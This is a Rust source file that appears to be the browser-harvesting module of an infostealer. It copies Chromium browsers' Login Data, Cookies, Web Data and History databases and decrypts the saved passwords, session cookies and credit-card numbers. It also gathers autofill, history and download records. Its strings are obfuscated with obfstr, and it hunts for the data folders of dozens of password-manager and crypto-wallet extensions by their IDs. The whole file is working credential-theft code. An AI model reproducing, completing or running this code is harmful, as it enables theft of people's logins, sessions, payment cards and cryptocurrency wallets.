use std::collections::HashMap;

use rusqlite::Connection;

#[derive(Clone)]
pub struct LoginData {
    pub username: String,
    pub password: String,
    pub url: String,
}

//CREATE TABLE cookies(creation_utc INTEGER NOT NULL,host_key TEXT NOT NULL,top_frame_site_key TEXT NOT NULL,name TEXT NOT NULL,value TEXT NOT NULL,encrypted_value BLOB NOT NULL,path TEXT NOT NULL,expires_utc INTEGER NOT NULL,is_secure INTEGER NOT NULL,is_httponly INTEGER NOT NULL,last_access_utc INTEGER NOT NULL,has_expires INTEGER NOT NULL,is_persistent INTEGER NOT NULL,priority INTEGER NOT NULL,samesite INTEGER NOT NULL,source_scheme INTEGER NOT NULL,source_port INTEGER NOT NULL,is_same_party INTEGER NOT NULL,last_update_utc INTEGER NOT NULL);
pub struct Cookie {
    pub name: String,
    pub host: String,
    pub value: String,
    pub path: String,
    pub expires_utc: i64,
    pub is_secure: bool,
    pub is_httponly: bool,

}

pub struct AutoFill {
    pub name: String,
    pub value: String,
    pub count: u32,
}
pub struct CreditCardData {
    pub name_on_card: String,
    pub  expiration_month: i32,
    pub expiration_year: i32,
    pub card_number: Vec<u8>,
}

pub struct History {
    pub url: String,
    pub title: String,
    pub visit_time: u32,

}

pub struct DownloadData {
    pub site_url: String,
    pub path: String,
}

pub struct Browser {
    pub name: String,
    pub path: String,
    pub profiles: HashMap<String, Profile>,
}

pub struct Profile {
    pub name: String,
    pub path: String,
    pub local_state: String,
    pub login_data: Vec<LoginData>,
    pub cookies: Vec<Cookie>,
    pub autofill: Vec<AutoFill>,
    pub history: Vec<History>,
    pub download_data: Vec<DownloadData>,
    pub localstate_cache: Option<Vec<u8>>,
    pub extensions: HashMap<String, String>,
    pub credit_card_data: Vec<CreditCardData>, 
}


pub fn find_local_state(path: String) -> Option<String> {
    let mut local_state = None;
    for dir in walkdir::WalkDir::new(path).max_depth(4).into_iter().filter_map(|e| e.ok()) {
        if dir.metadata().is_ok() && !dir.metadata().unwrap().is_file() {
            continue;
        }

        if dir.file_name().to_string_lossy().contains(obfstr::obfstr!("Local State")) {
            local_state = Some(dir.path().display().to_string());
        }
    }
    local_state
}



impl Profile {
    pub fn new(name: String, path: String, local_state: String) -> Self {
        Self {
            name,
            path,
            local_state,
            login_data: vec![],
            autofill: vec![],
            cookies: vec![],
            download_data: vec![],
            history: vec![],
            localstate_cache: None,
            extensions: HashMap::new(),
            credit_card_data: Vec::new(), 
        }
    }

    pub fn grab_all(&mut self) {
        //todo, error handling
        let _ = get_login_data(self);
        let _ = get_cookies(self);
        let _ = get_credit_card_data(self);
        println!("{:#?}", get_autofill_data(self));
        println!("{:#?}", get_download_data(self));
        println!("{:#?}", get_history_data(self));
        get_extensions(self);
    }

    fn decrypt_data(&mut self, data: Vec<u8>) -> Option<Vec<u8>> {
        super::decrypt::decrypt_blob(data, self)
    }
}


pub fn get_history_data(profile: &mut Profile) -> Result<bool, Box<dyn std::error::Error>>{
    let tmp_file = format!("{}\\{}", std::env::temp_dir().to_string_lossy(), obfstr::obfstr!("History"));
    //std::fs::copy(format!("{}\\{}", profile.path, obfstr::obfstr!("History")), tmp_file.clone())?;

    crate::misc::try_copy(format!("{}\\{}", profile.path, obfstr::obfstr!("History")), tmp_file.clone())?;

    let conn = Connection::open(tmp_file.clone())?;

    let mut stmt = conn.prepare(obfstr::obfstr!("select url, visit_time from visits;"))?;

    let mut stmt_url = conn.prepare(obfstr::obfstr!("select url,title from urls where id = ?;"))?;

    let rows = stmt.query_map([], |row| {
        let url_ref: i32 = row.get(0)?;
        let (resolved_url, resolved_title) = stmt_url.query_row([url_ref], |row| {
            Ok((row.get(0)?, row.get(1)?))
        })?;
        Ok(History {
            url: resolved_url,
            title: resolved_title,
            visit_time: row.get(1)?,
        })
    })?.filter(|f|f.is_ok()).map(|f| f.unwrap()).filter(|f| !f.url.is_empty()).collect::<Vec<History>>();

    profile.history = rows;
    Ok(true)
}

pub fn get_download_data(profile: &mut Profile) -> Result<bool, Box<dyn std::error::Error>> {
    let tmp_file = format!("{}\\{}", std::env::temp_dir().to_string_lossy(), obfstr::obfstr!("History"));

    //std::fs::copy(format!("{}\\{}", profile.path, obfstr::obfstr!("History")), tmp_file.clone())?;
    crate::misc::try_copy(format!("{}\\{}", profile.path, obfstr::obfstr!("History")), tmp_file.clone())?;

    let conn = Connection::open(tmp_file.clone())?;

    let mut stmt = conn.prepare(obfstr::obfstr!("select tab_url, current_path from downloads;"))?;

    let rows = stmt.query_map([], |row| {
        Ok(DownloadData {
           site_url: row.get(0)?,
           path: row.get(1)?,
        })
    })?.filter(|f|f.is_ok()).map(|f| f.unwrap()).filter(|f| !f.path.is_empty() && !f.site_url.is_empty()).collect::<Vec<DownloadData>>();
    profile.download_data = rows;
    
    Ok(true)
}

pub fn get_autofill_data(profile: &mut Profile) -> Result<bool, Box<dyn std::error::Error>>  {
    let tmp_file = format!("{}\\{}", std::env::temp_dir().to_string_lossy(), obfstr::obfstr!("Web Data"));
    
    //std::fs::copy(format!("{}\\{}", profile.path, obfstr::obfstr!("Web Data")), tmp_file.clone())?;

    crate::misc::try_copy(format!("{}\\{}", profile.path, obfstr::obfstr!("Web Data")), tmp_file.clone())?;

    let conn = Connection::open(tmp_file.clone())?; 
    let mut stmt = conn.prepare(obfstr::obfstr!("SELECT name, value, count FROM autofill;"))?;


    let rows = stmt.query_map([], |row| {
        Ok(AutoFill {
            name: row.get(0)?,
            value: row.get(1)?,
            count: row.get(2)?,
        })
    })?.filter(|f|f.is_ok()).map(|f| f.unwrap()).filter(|f| !f.name.is_empty() && !f.value.is_empty()).collect::<Vec<AutoFill>>();
    
    profile.autofill = rows;
    
    Ok(true)
}
 
pub fn get_cookies(profile: &mut Profile) -> Result<bool, Box<dyn std::error::Error>> {
    //copy to temp dir

    let tmp_file = format!("{}\\{}", std::env::temp_dir().to_string_lossy(), obfstr::obfstr!("Cookies"));

    let possible_files = vec![obfstr::obfstr!("Cookies").to_string(), obfstr::obfstr!("\\Network\\Cookies").to_string(), obfstr::obfstr!("Cookies.json").to_string()];

    let mut found = None;

    for file in possible_files {
        if std::fs::metadata(format!("{}\\{}", &profile.path, file)).is_ok() {
            found = Some(format!("{}\\{}", &profile.path, file));
            break;
        }
    }

    if found.is_none() {
        return Ok(false);
    }
    let binding = found.unwrap();

    //std::fs::copy(binding, tmp_file.clone())?;

    crate::misc::try_copy(binding, tmp_file.clone())?;

    let conn = Connection::open(tmp_file.clone())?;
    // get data
    let mut stmt = conn.prepare(obfstr::obfstr!("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies"))?;

    let rows = stmt.query_map([], |row| {
        let encrypted_blob = row.get(2)?;
        let decrypted = profile.decrypt_data(encrypted_blob);

        if decrypted.is_none() {
            return Err(rusqlite::Error::InvalidQuery.into());
        }

        Ok(Cookie {
            name: row.get(1)?,
            host: row.get(0)?,
            value: String::from_utf8(decrypted.unwrap()).map_err(|_| rusqlite::Error::InvalidQuery)?,
            path: row.get(3)?,
            expires_utc: row.get(4)?,
            is_secure: row.get(5)?,
            is_httponly: row.get(6)?,
        })
    })?.filter(|f|f.is_ok()).map(|f| f.unwrap()).filter(|f| !f.host.is_empty() && !f.value.is_empty()).collect::<Vec<Cookie>>();
    profile.cookies = rows;

    let _ = std::fs::remove_file(tmp_file);

    Ok(true)

}

pub fn get_login_data(profile: &mut Profile) -> Result<bool, Box<dyn std::error::Error>> {
    // copy to temp dir

    let tmp_file = format!(
        "{}\\{}",
        std::env::temp_dir().to_string_lossy(),
        obfstr::obfstr!("Login Data")
    );
    /*std::fs::copy(format!(
        "{}\\{}",
        &profile.path,
        obfstr::obfstr!("Login Data")
    ), tmp_file.clone())?;*/

    crate::misc::try_copy(format!(
        "{}\\{}",
        &profile.path,
        obfstr::obfstr!("Login Data")
    ), tmp_file.clone())?;


    // open db

    let conn = rusqlite::Connection::open(tmp_file.clone())?;

    // get data

    let mut stmt = conn.prepare(obfstr::obfstr!("SELECT action_url, username_value, password_value FROM logins"))?;

    let rows = stmt.query_map([], |row| {
        let pw = profile.decrypt_data(row.get(2)?).unwrap_or(obfstr::obfstr!("Error while decrypting").into());
        Ok(LoginData {
            url: row.get(0)?,
            username: row.get(1)?,
            password: String::from_utf8(pw).map_err(|_| rusqlite::Error::InvalidQuery)?,
        })
    })?.filter(|f|f.is_ok()).map(|f| f.unwrap()).filter(|f| !f.username.is_empty() && !f.url.is_empty()).collect::<Vec<LoginData>>();

    profile.login_data = rows;
    let _ = std::fs::remove_file(tmp_file);

    Ok(true)
    
}

pub fn get_credit_card_data(profile: &mut Profile) -> Result<bool, Box<dyn std::error::Error>> {
    
    // Prepare the temporary file path for storing credit card data
    let tmp_file = format!("{}/{}", std::env::temp_dir().to_string_lossy(), obfstr::obfstr!("CreditCardData"));

    // Copy the necessary file from the profile path to the temporary location
    crate::misc::try_copy(format!("{}/{}", profile.path, obfstr::obfstr!("Web Data")), tmp_file.clone())?;

    // Open a connection to the SQLite database
    let conn = Connection::open(&tmp_file)?;

    // Prepare the SQL statement for retrieving credit card data
    let mut stmt = conn.prepare(
        obfstr::obfstr!("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;"),
    )?;

    // Vector to store the credit card data
    let mut credit_card_data = Vec::new();

    // Iterate over the result set of the SQL query
    for row in stmt.query_map([], |row| {
        Ok(CreditCardData {
            name_on_card: row.get(0)?,
            expiration_month: row.get(1)?,
            expiration_year: row.get(2)?,
            card_number: row.get(3)?,
        })
    })? {
        match row {
            Ok(mut data) => {
                // Decrypt the card number using the profile's decrypt_data method
                if let Some(decrypted_card_number) = profile.decrypt_data(data.card_number.clone()) {
                    data.card_number = decrypted_card_number;
                } else {
                    // Unable to decrypt the card number, skip this entry
                    //println!("Unable to decrypt card number. Skipping this entry.");
                    continue;
                }

                // Check if any of the fields is empty or invalid
                if data.name_on_card.is_empty()
                    || data.expiration_month == 0
                    || data.expiration_year == 0
                    || data.card_number.is_empty()
                {
                    // Skip this entry if any field is empty or invalid
                    //println!("Invalid or empty data. Skipping this entry.");
                    continue;
                }
                // Print the decrypted credit card data
                /* 
                println!(
                    "Name: {}, Expiry: {}/{}, Card Number: {}",
                    data.name_on_card,
                    data.expiration_month,
                    data.expiration_year,
                    String::from_utf8_lossy(&data.card_number)
                );
                */

                unsafe {
                    crate::CREDIT_CARDS += 1;
                }

                // Store the decrypted data in the vector
                credit_card_data.push(data);
            }
            Err(_err) => {
                // Print an error message for any issues in retrieving data
                //println!("Error retrieving credit card data: {}", err);
            }
        }
    }

    // Store the decrypted credit card data in the profile
    profile.credit_card_data = credit_card_data;

    // Operation completed successfully
    Ok(true)
}

pub fn get_extensions(profile: &mut Profile) {
    let mut extensions = std::collections::HashMap::new(); 
    extensions.insert(obfstr::obfstr!("Authenticator").to_string(),           obfstr::obfstr!("bhghoamapcdpbohphigoooaddinpkbai").to_string());
    extensions.insert(obfstr::obfstr!("EOS Authenticator").to_string(),       obfstr::obfstr!("oeljdldpnmdbchonielidgobddffflal").to_string());
    extensions.insert(obfstr::obfstr!("Bitwarden").to_string(),               obfstr::obfstr!("nngceckbapebfimnlniiiahkandclblb").to_string());
    extensions.insert(obfstr::obfstr!("KeePassXC").to_string(),               obfstr::obfstr!("oboonakemofpalcgghocfoadofidjkkk").to_string());
    extensions.insert(obfstr::obfstr!("Dashlane").to_string(),                obfstr::obfstr!("fdjamakpfbbddfjaooikfcpapjohcfmg").to_string());
    extensions.insert(obfstr::obfstr!("1Password").to_string(),               obfstr::obfstr!("aeblfdkhhhdcdjpifhhbdiojplfjncoa").to_string());
    extensions.insert(obfstr::obfstr!("NordPass").to_string(),                obfstr::obfstr!("fooolghllnmhmmndgjiamiiodkpenpbb").to_string());
    extensions.insert(obfstr::obfstr!("Keeper").to_string(),                  obfstr::obfstr!("bfogiafebfohielmmehodmfbbebbbpei").to_string());
    extensions.insert(obfstr::obfstr!("RoboForm").to_string(),                obfstr::obfstr!("pnlccmojcmeohlpggmfnbbiapkmbliob").to_string());
    extensions.insert(obfstr::obfstr!("LastPass").to_string(),                obfstr::obfstr!("hdokiejnpimakedhajhdlcegeplioahd").to_string());
    extensions.insert(obfstr::obfstr!("BrowserPass").to_string(),             obfstr::obfstr!("naepdomgkenhinolocfifgehidddafch").to_string());
    extensions.insert(obfstr::obfstr!("MYKI").to_string(),                    obfstr::obfstr!("bmikpgodpkclnkgmnpphehdgcimmided").to_string());
    extensions.insert(obfstr::obfstr!("Splikity").to_string(),                obfstr::obfstr!("jhfjfclepacoldmjmkmdlmganfaalklb").to_string());
    extensions.insert(obfstr::obfstr!("CommonKey").to_string(),               obfstr::obfstr!("chgfefjpcobfbnpmiokfjjaglahmnded").to_string());
    extensions.insert(obfstr::obfstr!("Zoho Vault").to_string(),              obfstr::obfstr!("igkpcodhieompeloncfnbekccinhapdb").to_string());
    extensions.insert(obfstr::obfstr!("Norton Password Manager").to_string(), obfstr::obfstr!("admmjipmmciaobhojoghlmleefbicajg").to_string());
    extensions.insert(obfstr::obfstr!("Avira Password Manager").to_string(),  obfstr::obfstr!("caljgklbbfbcjjanaijlacgncafpegll").to_string());
    extensions.insert(obfstr::obfstr!("Trezor Password Manager").to_string(), obfstr::obfstr!("imloifkgjagghnncjkhggdhalmcnfklk").to_string());    
    extensions.insert(obfstr::obfstr!("MetaMask").to_string(),                obfstr::obfstr!("nkbihfbeogaeaoehlefnkodbefgpgknn").to_string());
    extensions.insert(obfstr::obfstr!("TronLink").to_string(),                obfstr::obfstr!("ibnejdfjmmkpcnlpebklmnkoeoihofec").to_string());
    extensions.insert(obfstr::obfstr!("BinanceChain").to_string(),            obfstr::obfstr!("fhbohimaelbohpjbbldcngcnapndodjp").to_string());
    extensions.insert(obfstr::obfstr!("Coin98").to_string(),                  obfstr::obfstr!("aeachknmefphepccionboohckonoeemg").to_string());
    extensions.insert(obfstr::obfstr!("iWallet").to_string(),                 obfstr::obfstr!("kncchdigobghenbbaddojjnnaogfppfj").to_string());
    extensions.insert(obfstr::obfstr!("Wombat").to_string(),                  obfstr::obfstr!("amkmjjmmflddogmhpjloimipbofnfjih").to_string());
    extensions.insert(obfstr::obfstr!("MEW CX").to_string(),                  obfstr::obfstr!("nlbmnnijcnlegkjjpcfjclmcfggfefdm").to_string());
    extensions.insert(obfstr::obfstr!("NeoLine").to_string(),                 obfstr::obfstr!("cphhlgmgameodnhkjdmkpanlelnlohao").to_string());
    extensions.insert(obfstr::obfstr!("Terra Station").to_string(),           obfstr::obfstr!("aiifbnbfobpmeekipheeijimdpnlpgpp").to_string());
    extensions.insert(obfstr::obfstr!("Keplr").to_string(),                   obfstr::obfstr!("dmkamcknogkgcdfhhbddcghachkejeap").to_string());
    extensions.insert(obfstr::obfstr!("Sollet").to_string(),                  obfstr::obfstr!("fhmfendgdocmcbmfikdcogofphimnkno").to_string());
    extensions.insert(obfstr::obfstr!("ICONex").to_string(),                  obfstr::obfstr!("flpiciilemghbmfalicajoolhkkenfel").to_string());
    extensions.insert(obfstr::obfstr!("KHC").to_string(),                     obfstr::obfstr!("hcflpincpppdclinealmandijcmnkbgn").to_string());
    extensions.insert(obfstr::obfstr!("TezBox").to_string(),                 obfstr::obfstr!("mnfifefkajgofkcjkemidiaecocnkjeh").to_string());
    extensions.insert(obfstr::obfstr!("Byone").to_string(),                   obfstr::obfstr!("nlgbhdfgdhgbiamfdfmbikcdghidoadd").to_string());
    extensions.insert(obfstr::obfstr!("OneKey").to_string(),                  obfstr::obfstr!("infeboajgfhgbjpjbeppbkgnabfdkdaf").to_string());
    extensions.insert(obfstr::obfstr!("DAppPlay").to_string(),                obfstr::obfstr!("lodccjjbdhfakaekdiahmedfbieldgik").to_string());
    extensions.insert(obfstr::obfstr!("BitClip").to_string(),                 obfstr::obfstr!("ijmpgkjfkbfhoebgogflfebnmejmfbml").to_string());
    extensions.insert(obfstr::obfstr!("Steem Keychain").to_string(),          obfstr::obfstr!("lkcjlnjfpbikmcmbachjpdbijejflpcm").to_string());
    extensions.insert(obfstr::obfstr!("Nash Extension").to_string(),          obfstr::obfstr!("onofpnbbkehpmmoabgpcpmigafmmnjhl").to_string());
    extensions.insert(obfstr::obfstr!("Hycon Lite Client").to_string(),       obfstr::obfstr!("bcopgchhojmggmffilplmbdicgaihlkp").to_string());
    extensions.insert(obfstr::obfstr!("ZilPay").to_string(),                  obfstr::obfstr!("klnaejjgbibmhlephnhpmaofohgkpgkd").to_string());
    extensions.insert(obfstr::obfstr!("Leaf Wallet").to_string(),             obfstr::obfstr!("cihmoadaighcejopammfbmddcmdekcje").to_string());
    extensions.insert(obfstr::obfstr!("Cyano Wallet").to_string(),            obfstr::obfstr!("dkdedlpgdmmkkfjabffeganieamfklkm").to_string());
    extensions.insert(obfstr::obfstr!("Cyano Wallet Pro").to_string(),        obfstr::obfstr!("icmkfkmjoklfhlfdkkkgpnpldkgdmhoe").to_string());
    extensions.insert(obfstr::obfstr!("Nabox Wallet").to_string(),            obfstr::obfstr!("nknhiehlklippafakaeklbeglecifhad").to_string());
    extensions.insert(obfstr::obfstr!("Polymesh Wallet").to_string(),         obfstr::obfstr!("jojhfeoedkpkglbfimdfabpdfjaoolaf").to_string());
    extensions.insert(obfstr::obfstr!("Nifty Wallet").to_string(),            obfstr::obfstr!("jbdaocneiiinmjbjlgalhcelgbejmnid").to_string());
    extensions.insert(obfstr::obfstr!("Liquality Wallet").to_string(),        obfstr::obfstr!("kpfopkelmapcoipemfendmdcghnegimn").to_string());
    extensions.insert(obfstr::obfstr!("Math Wallet").to_string(),             obfstr::obfstr!("afbcbjpbpfadlkmhmclhkeeodmamcflc").to_string());
    extensions.insert(obfstr::obfstr!("Coinbase Wallet").to_string(),         obfstr::obfstr!("hnfanknocfeofbddgcijnmhnfnkdnaad").to_string());
    extensions.insert(obfstr::obfstr!("Clover Wallet").to_string(),           obfstr::obfstr!("nhnkbkgjikgcigadomkphalanndcapjk").to_string());
    extensions.insert(obfstr::obfstr!("Yoroi").to_string(),                   obfstr::obfstr!("ffnbelfdoeiohenkjibnmadjiehjhajb").to_string());
    extensions.insert(obfstr::obfstr!("Guarda").to_string(),                  obfstr::obfstr!("hpglfhgfnhbgpjdenjgmdgoeiappafln").to_string());
    extensions.insert(obfstr::obfstr!("EQUAL Wallet").to_string(),            obfstr::obfstr!("blnieiiffboillknjnepogjhkgnoapac").to_string());
    extensions.insert(obfstr::obfstr!("BitApp Wallet").to_string(),           obfstr::obfstr!("fihkakfobkmkjojpchpfgcmhfjnmnfpi").to_string());
    extensions.insert(obfstr::obfstr!("Auro Wallet").to_string(),             obfstr::obfstr!("cnmamaachppnkjgnildpdmkaakejnhae").to_string());
    extensions.insert(obfstr::obfstr!("Saturn Wallet").to_string(),           obfstr::obfstr!("nkddgncdjgjfcddamfgcmfnlhccnimig").to_string());
    extensions.insert(obfstr::obfstr!("Ronin Wallet").to_string(),            obfstr::obfstr!("fnjhmkhhmkbjkkabndcnnogagogbneec").to_string());
    extensions.insert(obfstr::obfstr!("Exodus").to_string(),                  obfstr::obfstr!("aholpfdialjgjfhomihkjbmgjidlcdno").to_string());
    extensions.insert(obfstr::obfstr!("Maiar DeFi Wallet").to_string(),       obfstr::obfstr!("dngmlblcodfobpdpecaadgfbcggfjfnm").to_string());
    extensions.insert(obfstr::obfstr!("Nami").to_string(),                    obfstr::obfstr!("lpfcbjknijpeeillifnkikgncikgfhdo").to_string());
    extensions.insert(obfstr::obfstr!("Eternl").to_string(),                  obfstr::obfstr!("kmhcihpebfmpgmihbkipmjlmmioameka").to_string());
    extensions.insert(obfstr::obfstr!("Phantom Wallet").to_string(),          obfstr::obfstr!("bfnaelmomeimhlpmgjnjophhpkkoljpa").to_string());
    extensions.insert(obfstr::obfstr!("Metamask_edge").to_string(),           obfstr::obfstr!("ejbalbakoplchlghecdalmeeeajnimhm").to_string());


    let mut found = HashMap::new();


    for (name, path) in extensions {
        let path = format!("{}\\{}\\{path}", profile.path, obfstr::obfstr!("Local Extension Settings"));

        if std::path::Path::new(&path).exists() {
            found.insert(name.clone(), path.clone());
            println!("found {} - {}", name, path);
        }
    }
    profile.extensions = found;
}